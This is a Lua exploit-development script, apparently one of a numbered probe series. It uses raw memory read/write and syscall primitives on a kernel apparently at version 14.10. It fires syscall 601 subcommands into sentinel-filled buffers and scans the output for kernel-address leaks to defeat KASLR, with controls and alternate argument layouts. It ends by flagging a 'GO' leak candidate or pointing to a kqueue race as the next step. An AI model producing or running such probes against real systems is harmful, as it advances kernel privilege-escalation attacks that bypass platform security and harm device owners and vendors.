-- CRASH_CLASS: LOW
-- PROBE 65a: sys 601 deep buffer dump — full hex dump of all 7 working subcmds
--
-- Previous probe 55d confirmed 7 subcmds return ret=0 on 14.10:
--   0x00, 0x07, 0x09, 0x0d, 0x13, 0x14, 0x19
-- But it only read first 4-8 bytes of output. This probe reads up to 0x400 bytes
-- with a DEADBEEF sentinel fill to detect exactly how much the handler writes.
--
-- Looking for:
--   - Qwords in 0xFFFFFFFF80000000–0xFFFFFFFFFFFFFFFF (kernel virtual addresses)
--   - Non-sentinel, non-zero data (handler wrote something)
--   - Userland pointers matching known module bases (confirms handler populates buffer)
--
-- Control: cmd 0xFF (invalid, expect ret=-1, sentinel intact)

print("=== PROBE 65a: sys 601 DEEP BUFFER DUMP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X_%08X", h, l)
end

local sc601 = make_syscall(601)
local sc20 = make_syscall(20)

local function alive()
    local ok, v = pcall(function() return sc20() end)
    return ok
end

local pid_ok, pid_val = pcall(function() return sc20() end)
print("PID: " .. to_num(pid_val))

local SENTINEL = 0xDEADBEEF
local BUF_SIZE = 0x400

local function fill_sentinel(buf, size)
    for i = 0, size - 4, 4 do
        safe_wd(buf + i, SENTINEL)
    end
end

local function dump_buffer(buf, size, label)
    local first_sentinel = size
    local nonzero_nonsent = 0
    local kptr_count = 0
    local kptrs = {}

    for off = 0, size - 4, 4 do
        local v = safe_rd(buf + off)
        if v == nil then break end
        if v ~= SENTINEL and v ~= 0 then
            nonzero_nonsent = nonzero_nonsent + 1
        end
        if v == SENTINEL and first_sentinel == size then
            local prev = safe_rd(buf + off - 4)
            if off == 0 or (prev and prev == SENTINEL) then
                first_sentinel = off
            end
        end
    end

    for off = 0, size - 8, 8 do
        local lo = safe_rd(buf + off)
        local hi = safe_rd(buf + off + 4)
        if hi and lo then
            if hi >= 0xFFFF8000 and lo ~= SENTINEL then
                kptr_count = kptr_count + 1
                table.insert(kptrs, {off = off, hi = hi, lo = lo})
            end
        end
    end

    print(string.format("  handler wrote ~%d bytes, %d non-sentinel dwords, %d kernel-range qwords",
        first_sentinel, nonzero_nonsent, kptr_count))

    for off = 0, math.min(size - 4, 0xFF), 4 do
        local v = safe_rd(buf + off)
        if v and v ~= 0 and v ~= SENTINEL then
            print(string.format("    +0x%03X: 0x%08X", off, v))
        end
    end

    if nonzero_nonsent > 16 then
        print("  ... (showing additional non-sentinel values beyond 0x100)")
        for off = 0x100, size - 4, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 and v ~= SENTINEL then
                print(string.format("    +0x%03X: 0x%08X", off, v))
            end
        end
    end

    if kptr_count > 0 then
        print("  >>> KERNEL POINTERS FOUND:")
        for _, kp in ipairs(kptrs) do
            print(string.format("    +0x%03X: 0x%08X_%08X  <<< KERNEL VA", kp.off, kp.hi, kp.lo))
        end
    end

    return kptr_count, nonzero_nonsent
end

local total_kptrs = 0

local cmds = {
    {cmd = 0x00, name = "process state query", size = BUF_SIZE},
    {cmd = 0x07, name = "BEXTR bitfield extraction", size = 0x100},
    {cmd = 0x09, name = "global byte leak", size = 0x100},
    {cmd = 0x0d, name = "thread enumeration", size = BUF_SIZE},
    {cmd = 0x13, name = "device state read 0x13", size = 0x200},
    {cmd = 0x14, name = "device state read 0x14", size = 0x200},
    {cmd = 0x19, name = "device state read 0x19", size = 0x200},
}

for _, entry in ipairs(cmds) do
    print("")
    print(string.format("[CMD 0x%02X] %s (buffer %d bytes)", entry.cmd, entry.name, entry.size))

    local buf = memory.alloc(entry.size)
    fill_sentinel(buf, entry.size)

    local ok, ret = pcall(function()
        return sc601(uint64(entry.cmd), uint64(buf), uint64(entry.size))
    end)

    if ok then
        local h, l = get_hi_lo(ret)
        print("  ret: " .. hexval(ret))
        if l == 0xFFFFFFFF and h == 0 then
            print("  returned -1, skipping buffer")
        else
            local kp, nz = dump_buffer(buf, entry.size, entry.name)
            total_kptrs = total_kptrs + kp
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end

    if not alive() then
        print("  PROCESS DEAD after cmd 0x" .. string.format("%02X", entry.cmd))
        print("=== PROBE 65a ABORTED ===")
        return
    end
end

-- Control: invalid cmd 0xFF
print("")
print("[CONTROL] cmd 0xFF — invalid subcmd (expect ret=-1, sentinel intact)")
do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 0x100)
    local ok, ret = pcall(function()
        return sc601(uint64(0xFF), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local intact = true
        for off = 0, 0xFC, 4 do
            local v = safe_rd(buf + off)
            if v ~= SENTINEL then
                intact = false
                print(string.format("  SENTINEL BROKEN at +0x%02X: 0x%08X", off, v or 0))
                break
            end
        end
        if intact then print("  sentinel intact (good)") end
    else
        print("  CRASHED: " .. tostring(ret))
    end
end

-- Negative control: cmd 0x12 (known blocked)
print("")
print("[NEG CONTROL] cmd 0x12 — known blocked (expect ret=-1)")
do
    local buf = memory.alloc(0x100)
    fill_sentinel(buf, 0x100)
    local ok, ret = pcall(function()
        return sc601(uint64(0x12), uint64(buf), uint64(0x100))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
    else
        print("  CRASHED: " .. tostring(ret))
    end
end

if not alive() then
    print("PROCESS DEAD")
    return
end

-- Also try cmd 0x05 and 0x10 with larger buffers (they returned -1 before
-- but maybe with different arg layout they work)
print("")
print("[BONUS] cmd 0x05 process info (0xb8 bytes, 3 arg layouts)")
for _, layout in ipairs({
    {name = "buf,size", a1 = "buf", a2 = "size"},
    {name = "0,buf",    a1 = "0",   a2 = "buf"},
    {name = "pid,buf",  a1 = "pid", a2 = "buf"},
}) do
    local buf = memory.alloc(0x200)
    fill_sentinel(buf, 0x200)
    local a1, a2
    if layout.a1 == "buf" then a1 = buf else a1 = (layout.a1 == "pid" and to_num(pid_val) or 0) end
    if layout.a2 == "buf" then a2 = buf else a2 = 0x200 end

    local ok, ret = pcall(function()
        return sc601(uint64(0x05), uint64(a1), uint64(a2))
    end)
    if ok then
        local h, l = get_hi_lo(ret)
        local written = false
        if l ~= 0xFFFFFFFF or h ~= 0 then
            for off = 0, 0x1FC, 4 do
                local v = safe_rd(buf + off)
                if v and v ~= SENTINEL and v ~= 0 then written = true; break end
            end
        end
        print(string.format("  %s: ret=%s data=%s", layout.name, hexval(ret), written and "YES" or "no"))
        if written then
            dump_buffer(buf, 0x200, "cmd 0x05 " .. layout.name)
        end
    else
        print(string.format("  %s: CRASHED", layout.name))
    end
    if not alive() then print("PROCESS DEAD"); return end
end

print("")
print("=== SUMMARY ===")
print("Total kernel-range pointers found: " .. total_kptrs)
if total_kptrs > 0 then
    print(">>> GO: KASLR info-leak candidate identified. Trace specific fields.")
else
    print(">>> No kernel pointers in sys 601 buffers.")
    print(">>> Next: try thread-based kqueue race (probe 65b)")
end
print("=== PROBE 65a COMPLETE ===")
